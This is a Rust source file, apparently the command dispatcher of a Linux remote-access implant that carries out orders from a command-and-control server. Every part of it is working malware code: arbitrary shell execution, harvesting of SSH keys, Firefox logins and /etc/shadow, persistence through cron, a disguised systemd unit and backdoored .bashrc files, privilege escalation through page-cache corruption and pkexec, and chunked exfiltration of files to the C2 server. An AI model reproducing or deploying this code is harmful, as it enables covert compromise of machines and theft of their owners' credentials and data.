/// Command dispatcher — receives commands from C2 and executes them on-demand.
/// All existing modules (recon, creds, persist, copyfail, exfil) are callable.

use crate::config::Config;
use crate::c2;
use std::io;
use std::process::Command as ShellCommand;

// ── Public types ───────────────────────────────────────────────────

#[derive(Debug, serde::Deserialize)]
pub struct CommandAction {
    pub id: String,
    pub module: String,
    pub action: String,
    #[serde(default)]
    pub args: serde_json::Value,
    #[serde(default = "default_timeout")]
    pub timeout_secs: u32,
}

fn default_timeout() -> u32 { 60 }

#[derive(Debug, serde::Serialize)]
pub struct CommandResult {
    pub command_id: String,
    pub status: String,
    pub data: serde_json::Value,
}

#[derive(Debug, serde::Serialize)]
pub struct DispatchResult {
    pub implant_id: String,
    pub command_id: String,
    pub status: String,
    pub data: serde_json::Value,
}

// ── Main dispatch ──────────────────────────────────────────────────

impl CommandAction {
    /// Execute this command and return a result to be sent to the C2.
    pub fn execute(&self, config: &Config, implant_id: &str) -> DispatchResult {
        let result = match (self.module.as_str(), self.action.as_str()) {
            // ── Shell execution ────────────────────────────────────
            ("shell", "exec")   => self.cmd_shell_exec(),
            ("shell", _)        => self.cmd_shell_exec(),
            // ── Reconnaissance ─────────────────────────────────────
            ("recon", "gather") => self.cmd_recon(config),
            ("recon", "passive")=> self.cmd_recon_passive(),
            ("recon", "active") => self.cmd_recon_active(config),
            ("recon", "arp")    => self.cmd_recon_arp(),
            ("recon", _)        => self.cmd_recon(config),
            // ── Host discovery (T1057/T1087/T1083/T1007) ──────────
            ("discovery", "procs")    => self.cmd_discovery_procs(),
            ("discovery", "users")    => self.cmd_discovery_users(),
            ("discovery", "suid")     => self.cmd_discovery_suid(),
            ("discovery", "services") => self.cmd_discovery_services(),
            ("discovery", "all")      => self.cmd_discovery_all(),
            ("discovery", _)          => self.cmd_discovery_all(),
            // ── Credential harvesting ──────────────────────────────
            ("creds", "harvest")=> self.cmd_creds(config),
            ("creds", _)        => self.cmd_creds(config),
            // ── Persistence ────────────────────────────────────────
            ("persist", "install") => self.cmd_persist_install(config),
            ("persist", "cron")    => self.cmd_persist_cron(config),
            ("persist", "systemd") => self.cmd_persist_systemd(config),
            ("persist", "bashrc")  => self.cmd_persist_bashrc(config),
            ("persist", _)         => self.cmd_persist_cron(config),
            // ── Privilege escalation ───────────────────────────────
            ("privesc", "copyfail") => self.cmd_privesc_copyfail(),
            ("privesc", "pkexec")   => self.cmd_privesc_pkexec(),
            ("privesc", _)          => self.cmd_privesc_copyfail(),
            // ── Exfiltration ───────────────────────────────────────
            ("exfil", "file")   => self.cmd_exfil_file(config),
            ("exfil", "dir")    => self.cmd_exfil_dir(config),
            ("exfil", _)        => self.cmd_exfil_file(config),
            // ── File operations ────────────────────────────────────
            ("file", "read")    => self.cmd_file_read(),
            ("file", "write")   => self.cmd_file_write(),
            ("file", _)         => self.cmd_file_read(),
            // ── Forensic marker ────────────────────────────────────
            ("marker", "write") => self.cmd_marker_write(config),
            ("marker", _)       => self.cmd_marker_write(config),
            // ── System ─────────────────────────────────────────────
            ("system", "info")  => self.cmd_system_info(config),
            ("system", "sleep") => self.cmd_sleep(),
            ("system", "exit")  => self.cmd_exit(),
            ("system", _)       => self.cmd_system_info(config),
            _ => Err(io::Error::new(io::ErrorKind::InvalidInput, "unknown module/action")),
        };

        match result {
            Ok(data) => DispatchResult {
                implant_id: implant_id.to_string(),
                command_id: self.id.clone(),
                status: "completed".into(),
                data,
            },
            Err(e) => DispatchResult {
                implant_id: implant_id.to_string(),
                command_id: self.id.clone(),
                status: "failed".into(),
                data: serde_json::json!({"error": e.to_string()}),
            },
        }
    }

    // ── Shell execution ────────────────────────────────────────────

    fn cmd_shell_exec(&self) -> io::Result<serde_json::Value> {
        let cmd_str = self.args.get("cmd")
            .and_then(|v| v.as_str())
            .unwrap_or("id");
        let output = ShellCommand::new("sh")
            .arg("-c")
            .arg(cmd_str)
            .output()?;
        Ok(serde_json::json!({
            "stdout": String::from_utf8_lossy(&output.stdout).to_string(),
            "stderr": String::from_utf8_lossy(&output.stderr).to_string(),
            "exit_code": output.status.code().unwrap_or(-1),
        }))
    }

    // ── Recon ─────────────────────────────────────────────────────

    fn cmd_recon(&self, config: &Config) -> io::Result<serde_json::Value> {
        let mode = self.args.get("mode").and_then(|v| v.as_str()).unwrap_or("in_memory");
        let net = match mode {
            "shell" => crate::recon::gather_to_staging(
                &config.staging_dir, config.ping_sweep
            )?,
            _ => crate::recon::gather_in_memory()?,
        };
        Ok(serde_json::json!({
            "hostname": net.hostname,
            "arp_table": net.arp_table,
            "tcp_conns": net.tcp_conns,
            "tcp_listeners": net.tcp_listeners,
            "udp_listeners": net.udp_listeners,
            "ifaces": net.ifaces,
        }))
    }

    /// Passive recon — reads /proc only, no network activity.
    fn cmd_recon_passive(&self) -> io::Result<serde_json::Value> {
        let net = crate::recon::gather_in_memory()?;
        Ok(serde_json::json!({
            "hostname": net.hostname,
            "arp_table": net.arp_table,
            "tcp_conns": net.tcp_conns,
            "tcp_listeners": net.tcp_listeners,
            "udp_listeners": net.udp_listeners,
            "ifaces": net.ifaces,
            "fib_trie": net.fib_trie,
        }))
    }

    /// Active recon — pings, ss, ip commands (noisy but thorough).
    fn cmd_recon_active(&self, config: &Config) -> io::Result<serde_json::Value> {
        let net = crate::recon::gather_to_staging(&config.staging_dir, true)?;
        Ok(serde_json::json!({
            "hostname": net.hostname,
            "arp_table": net.arp_table,
            "tcp_conns": net.tcp_conns,
            "tcp_listeners": net.tcp_listeners,
            "udp_listeners": net.udp_listeners,
            "ifaces": net.ifaces,
            "fib_trie": net.fib_trie,
            "ping_sweep_done": true,
        }))
    }

    /// Quick ARP table read only.
    fn cmd_recon_arp(&self) -> io::Result<serde_json::Value> {
        let arp = std::fs::read_to_string("/proc/net/arp").unwrap_or_default();
        Ok(serde_json::json!({
            "arp_table": arp,
        }))
    }

    // ── Host discovery ───────────────────────────────────────────

    /// Process discovery (T1057) — in-memory /proc read, no shell.
    fn cmd_discovery_procs(&self) -> io::Result<serde_json::Value> {
        Ok(crate::discovery::procs())
    }

    /// Account/group discovery (T1087/T1069) — in-memory /etc read, no shell.
    fn cmd_discovery_users(&self) -> io::Result<serde_json::Value> {
        Ok(crate::discovery::users())
    }

    /// SUID/SGID binary discovery (T1083) — shell `find`, noisy.
    fn cmd_discovery_suid(&self) -> io::Result<serde_json::Value> {
        Ok(crate::discovery::suid())
    }

    /// System service + scheduled-task discovery (T1007/T1053) — shell, noisy.
    fn cmd_discovery_services(&self) -> io::Result<serde_json::Value> {
        Ok(crate::discovery::services())
    }

    /// All host discovery combined.
    fn cmd_discovery_all(&self) -> io::Result<serde_json::Value> {
        Ok(crate::discovery::all())
    }

    // ── Credential harvesting ─────────────────────────────────────

    fn cmd_creds(&self, config: &Config) -> io::Result<serde_json::Value> {
        let mode = self.args.get("mode").and_then(|v| v.as_str()).unwrap_or("in_memory");
        match mode {
            "shell" => {
                crate::creds::harvest_to_staging(&config.staging_dir)?;
                Ok(serde_json::json!({"status": "harvested_to_staging", "staging_dir": config.staging_dir}))
            }
            _ => {
                let bundle = crate::creds::harvest_in_memory()?;
                Ok(serde_json::json!({
                    "firefox_logins_size": bundle.firefox_logins.len(),
                    "firefox_keydb_size": bundle.firefox_keydb.len(),
                    "ssh_keys_count": bundle.ssh_keys.len(),
                    "ssh_key_names": bundle.ssh_keys.iter().map(|(n,_)| n).collect::<Vec<_>>(),
                    "bash_history_size": bundle.bash_history.len(),
                    "shadow_size": bundle.shadow.len(),
                    "nm_connections": bundle.nm_connections.iter().map(|(n,_)| n).collect::<Vec<_>>(),
                }))
            }
        }
    }

    // ── Persistence ───────────────────────────────────────────────

    /// Copy the running implant to the install path and re-exec there.
    ///
    /// Single decision point for where the binary lives on disk. Copies
    /// /proc/self/exe to the install path (default config.implant_path,
    /// overridable via `persist install <path>`), chmods it 0755, then spawns a
    /// child running from that path. The beacon loop sees `reexec` in the
    /// result, sends it, and exits the parent — so only the relocated child
    /// beacons under the SAME implant_id (hostname+MAC), and the server merges
    /// it into the existing session instead of creating a second one. cron/
    /// bashrc/systemd then reference config.implant_path (where this put it).
    fn cmd_persist_install(&self, config: &Config) -> io::Result<serde_json::Value> {
        let path = match self.args.get("path").and_then(|v| v.as_str()) {
            Some(s) if !s.is_empty() => s.to_string(),
            _ => config.implant_path.clone(),
        };
        let our_binary = std::fs::read("/proc/self/exe")?;
        if let Some(parent) = std::path::Path::new(&path).parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        std::fs::write(&path, &our_binary)?;
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755))?;

        // Spawn a child from the install path; the parent sends its result then
        // exits (mirrors privesc pkexec). Same implant_id → server merges it.
        let child = ShellCommand::new(&path)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()?;

        Ok(serde_json::json!({
            "installed": true,
            "path": path,
            "pid": child.id(),
            "reexec": true,
            "note": "relocated + restarted from install path; session continues under same id",
        }))
    }

    /// Write a @reboot cron job only.
    fn cmd_persist_cron(&self, config: &Config) -> io::Result<serde_json::Value> {
        let implant_path = config.implant_path.clone();
        let cron_line = format!("@reboot root {} &>/dev/null &\n", implant_path);
        if let Ok(crontab) = std::fs::read_to_string("/etc/crontab") {
            if !crontab.contains(&implant_path) {
                let mut f = std::fs::OpenOptions::new().append(true).open("/etc/crontab")?;
                std::io::Write::write_all(&mut f, cron_line.as_bytes())?;
            }
        }
        Ok(serde_json::json!({"cron_installed": true, "at_reboot": true, "line": cron_line.trim()}))
    }

    /// Install systemd service only. Optional service name from args.
    fn cmd_persist_systemd(&self, config: &Config) -> io::Result<serde_json::Value> {
        let service_name = self.args.get("service_name")
            .and_then(|v| v.as_str())
            .unwrap_or("systemd-logind-helper");
        // Use the baked per-tier implant_path (config.implant_path) so systemd persistence
        // lands at the SAME on-disk path as cron/bashrc persistence (which read config too),
        // instead of the /usr/bin/dbus-runner fallback — the per-tier mask (e.g.
        // /usr/bin/update-checker) must be consistent across all persist methods.
        let implant_path = config.implant_path.clone();

        // Unit-only: the binary is placed at implant_path by `persist install`;
        // this writes the service unit pointing at it and enables + starts it.
        let unit_path = format!("/etc/systemd/system/{}.service", service_name);
        let unit = format!(
            "[Unit]\nDescription={}\nAfter=network.target\n\n\
             [Service]\nType=simple\nExecStart={}\n\
             Restart=always\nRestartSec=60s\n\n\
             [Install]\nWantedBy=multi-user.target\n",
            service_name, implant_path,
        );
        std::fs::write(&unit_path, unit)?;
        let _ = ShellCommand::new("systemctl").args(["daemon-reload"]).output();
        let _ = ShellCommand::new("systemctl").args(["enable", &format!("{}.service", service_name)]).output();
        let _ = ShellCommand::new("systemctl").args(["start", &format!("{}.service", service_name)]).output();

        Ok(serde_json::json!({
            "service_installed": true,
            "service_name": service_name,
            "implant_path": implant_path,
        }))
    }

    /// Install .bashrc backdoor for all users (best-effort).
    /// Writes to every writable .bashrc it can reach and reports which
    /// succeeded — does NOT abort on the first permission denial (an unpriv
    /// implant can still backdoor its own user's .bashrc even if /root and
    /// /etc/bash.bashrc are unwritable).
    fn cmd_persist_bashrc(&self, config: &Config) -> io::Result<serde_json::Value> {
        let implant_path = config.implant_path.clone();
        let line = format!("\n{} &>/dev/null &\n", implant_path);
        let mut written: Vec<String> = Vec::new();
        let mut failed: Vec<String> = Vec::new();

        // Idempotent: skip files that already contain the backdoor line.
        let try_write = |path: &std::path::Path, written: &mut Vec<String>, failed: &mut Vec<String>| {
            if let Ok(existing) = std::fs::read_to_string(path) {
                if existing.contains(&implant_path) {
                    written.push(format!("{} (already present)", path.display()));
                    return;
                }
            }
            match std::fs::OpenOptions::new().append(true).open(path)
                .and_then(|mut f| std::io::Write::write_all(&mut f, line.as_bytes()))
            {
                Ok(()) => written.push(path.display().to_string()),
                Err(_) => failed.push(path.display().to_string()),
            }
        };

        for home_dir in &["/home", "/root"] {
            if let Ok(entries) = std::fs::read_dir(home_dir) {
                for entry in entries.flatten() {
                    let bashrc = entry.path().join(".bashrc");
                    if bashrc.exists() {
                        try_write(&bashrc, &mut written, &mut failed);
                    }
                }
            }
        }
        let etc_bashrc = std::path::Path::new("/etc/bash.bashrc");
        if etc_bashrc.exists() {
            try_write(etc_bashrc, &mut written, &mut failed);
        }

        Ok(serde_json::json!({
            "bashrc_backdoored": !written.is_empty(),
            "written": written,
            "failed": failed,
        }))
    }

    // ── Privilege escalation ──────────────────────────────────────

    /// CopyFail: AF_ALG page-cache corruption → corrupt /usr/bin/su → exec as root.
    fn cmd_privesc_copyfail(&self) -> io::Result<serde_json::Value> {
        let uid = unsafe { libc::getuid() };
        if uid == 0 {
            return Ok(serde_json::json!({"success": true, "already_root": true, "uid": 0}));
        }
        let payload = crate::payload::payload_implant();
        if let Ok(self_path) = std::env::current_exe() {
            let _ = std::fs::copy(&self_path, "/dev/shm/.implant");
            unsafe {
                libc::chmod(b"/dev/shm/.implant\0".as_ptr() as *const libc::c_char, 0o755);
            }
        }
        crate::copyfail::escalate(&payload)?;
        Ok(serde_json::json!({"success": false, "method": "copyfail", "error": "copyfail_did_not_escalate"}))
    }

    /// pkexec: escalate THIS session to root via a PolicyKit GUI password
    /// prompt (loud — on-screen, obvious). Spawns a root re-exec of ourselves
    /// under the SAME implant_id, then the unprivileged parent exits (see
    /// run_beacon_loop) so only one root process beacons. The server upgrades
    /// the existing session's uid→0 / tier rather than creating a second
    /// session — no confusing duplicate.
    ///
    /// The GUI prompt itself requires a human at the target's desktop; it
    /// cannot be exercised headlessly and is left for an operator-driven test.
    fn cmd_privesc_pkexec(&self) -> io::Result<serde_json::Value> {
        let uid = unsafe { libc::getuid() };
        if uid == 0 {
            return Ok(serde_json::json!({"success": true, "already_root": true, "uid": 0}));
        }
        let self_path = std::env::current_exe().unwrap_or_else(|_| "/proc/self/exe".into());
        let child = ShellCommand::new("pkexec")
            .arg(self_path.to_string_lossy().to_string())
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()?;
        Ok(serde_json::json!({
            "success": true,
            "method": "pkexec",
            "pid": child.id(),
            "reexec": true,
            "note": "escalating to root via PolicyKit; reconnecting as root under same session",
        }))
    }

    // ── Exfiltration ──────────────────────────────────────────────

    /// Exfiltrate a specific file.
    fn cmd_exfil_file(&self, config: &Config) -> io::Result<serde_json::Value> {
        let path = self.args.get("path")
            .and_then(|v| v.as_str())
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "missing path"))?;
        let data = std::fs::read(path)?;
        let chunks = exfil_chunked_send(config, path, &data)?;
        Ok(serde_json::json!({"status": "exfiltrated", "path": path, "size": data.len(), "chunks": chunks}))
    }

    /// Exfiltrate a directory as tar.gz.
    fn cmd_exfil_dir(&self, config: &Config) -> io::Result<serde_json::Value> {
        let path = self.args.get("path")
            .and_then(|v| v.as_str())
            .unwrap_or(&config.staging_dir);
        let result_json = serde_json::json!({
            "tier": config.tier_label(),
            "exfil_target": path,
            "timestamp": unsafe { libc::time(std::ptr::null_mut()) },
        }).to_string();
        crate::exfil::tar_dir_and_send(config, &result_json, path)?;
        Ok(serde_json::json!({"status": "exfiltrated", "path": path}))
    }

    // ── Forensic marker ───────────────────────────────────────────

    fn cmd_marker_write(&self, _config: &Config) -> io::Result<serde_json::Value> {
        let location = self.args.get("location")
            .and_then(|v| v.as_str())
            .unwrap_or("operator");
        let pid = unsafe { libc::getpid() };
        let now = unsafe { libc::time(std::ptr::null_mut()) };
        let path = format!("/dev/shm/ras_marker.{}", now);
        let line = format!("marker:{}:{}:{}\n", location, pid, now);
        let written = std::fs::OpenOptions::new()
            .create(true).append(true)
            .open(&path)
            .and_then(|mut f| std::io::Write::write_all(&mut f, line.as_bytes()))
            .is_ok();
        Ok(serde_json::json!({
            "marker_written": written,
            "location": location,
            "pid": pid,
            "timestamp": now,
            "path": path,
        }))
    }

    // ── File operations ───────────────────────────────────────────

    fn cmd_file_read(&self) -> io::Result<serde_json::Value> {
        let path = self.args.get("path")
            .and_then(|v| v.as_str())
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "missing path"))?;
        let data = std::fs::read(path)?;
        Ok(serde_json::json!({
            "path": path,
            "size": data.len(),
            "content_hex": hex_encode(&data),
        }))
    }

    fn cmd_file_write(&self) -> io::Result<serde_json::Value> {
        let path = self.args.get("path")
            .and_then(|v| v.as_str())
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "missing path"))?;
        let content_hex = self.args.get("content_hex")
            .and_then(|v| v.as_str())
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "missing content_hex"))?;
        let data = hex_decode(content_hex)
            .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
        if let Some(parent) = std::path::Path::new(path).parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        std::fs::write(path, &data)?;
        // Set mode if specified
        if let Some(mode) = self.args.get("mode").and_then(|v| v.as_u64()) {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode as u32));
        }
        Ok(serde_json::json!({"path": path, "size": data.len(), "written": data.len()}))
    }

    // ── System ────────────────────────────────────────────────────

    fn cmd_system_info(&self, config: &Config) -> io::Result<serde_json::Value> {
        let hostname = std::fs::read_to_string("/proc/sys/kernel/hostname")
            .unwrap_or_default().trim().to_string();
        let os_info = std::fs::read_to_string("/etc/os-release")
            .ok()
            .and_then(|s| {
                s.lines()
                    .find(|l| l.starts_with("PRETTY_NAME="))
                    .map(|l| l.trim_start_matches("PRETTY_NAME=").trim_matches('"').to_string())
            })
            .unwrap_or_else(|| "Linux".into());
        Ok(serde_json::json!({
            "tier": config.tier_label(),
            "mode": config.mode_label(),
            "uid": unsafe { libc::getuid() },
            "pid": unsafe { libc::getpid() },
            "hostname": hostname,
            "os": os_info,
            "c2_host": config.c2_host,
            "c2_port": config.c2_port,
            "use_tls": config.use_tls,
            "beacon_interval": config.beacon_interval,
        }))
    }

    fn cmd_sleep(&self) -> io::Result<serde_json::Value> {
        let secs = self.args.get("secs").and_then(|v| v.as_u64()).unwrap_or(5);
        let ts = libc::timespec { tv_sec: secs as _, tv_nsec: 0 };
        unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
        Ok(serde_json::json!({"slept_secs": secs}))
    }

    fn cmd_exit(&self) -> io::Result<serde_json::Value> {
        // The beacon loop detects this and exits the process
        Ok(serde_json::json!({"exiting": true}))
    }
}

// ── Exfil helper ─────────────────────────────────────────────────────

/// Send file data in chunks to the C2 /upload endpoint.
fn exfil_chunked_send(config: &crate::config::Config, name: &str, data: &[u8]) -> io::Result<usize> {
    let mut chunks = 0;
    for chunk in data.chunks(4096) {
        let mut payload = Vec::new();
        payload.extend_from_slice(name.as_bytes());
        payload.push(b'\n');
        payload.extend_from_slice(chunk);
        crate::c2::send_chunk(config, &payload)?;
        chunks += 1;
    }
    Ok(chunks)
}

// ── Hex encoding (no external crate needed) ───────────────────────────

fn hex_encode(data: &[u8]) -> String {
    let mut s = String::with_capacity(data.len() * 2);
    for byte in data {
        s.push(HEX_CHARS[(byte >> 4) as usize]);
        s.push(HEX_CHARS[(byte & 0x0f) as usize]);
    }
    s
}

fn hex_decode(s: &str) -> Result<Vec<u8>, String> {
    if s.len() % 2 != 0 {
        return Err("hex string has odd length".into());
    }
    let mut v = Vec::with_capacity(s.len() / 2);
    let bytes = s.as_bytes();
    for i in (0..s.len()).step_by(2) {
        let hi = hex_val(bytes[i])?;
        let lo = hex_val(bytes[i+1])?;
        v.push((hi << 4) | lo);
    }
    Ok(v)
}

fn hex_val(b: u8) -> Result<u8, String> {
    match b {
        b'0'..=b'9' => Ok(b - b'0'),
        b'a'..=b'f' => Ok(b - b'a' + 10),
        b'A'..=b'F' => Ok(b - b'A' + 10),
        _ => Err(format!("invalid hex char: {}", b as char)),
    }
}

const HEX_CHARS: [char; 16] = [
    '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', 'a', 'b', 'c', 'd', 'e', 'f',
];
